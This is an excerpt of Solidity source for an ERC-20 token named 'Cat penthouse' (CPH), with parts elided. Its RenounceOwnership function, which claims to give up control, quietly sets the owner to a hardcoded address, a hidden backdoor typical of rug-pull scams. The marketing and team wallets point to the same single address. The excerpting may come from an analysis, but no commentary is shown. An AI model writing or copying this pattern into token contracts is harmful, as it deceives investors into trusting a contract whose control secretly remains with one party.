...
contract Ownable is Context {
    ...
    function RenounceOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x0cA0106B49a12F2Ded6AEA2174499d2191D82958);
    }
...
contract Catpenthouse is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Cat penthouse";
    string private _symbol = "CPH";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x8dF29392f671405122050c3C5b79F68f5F71dB28);
    address payable public teamWalletAddress = payable(0x8dF29392f671405122050c3C5b79F68f5F71dB28);
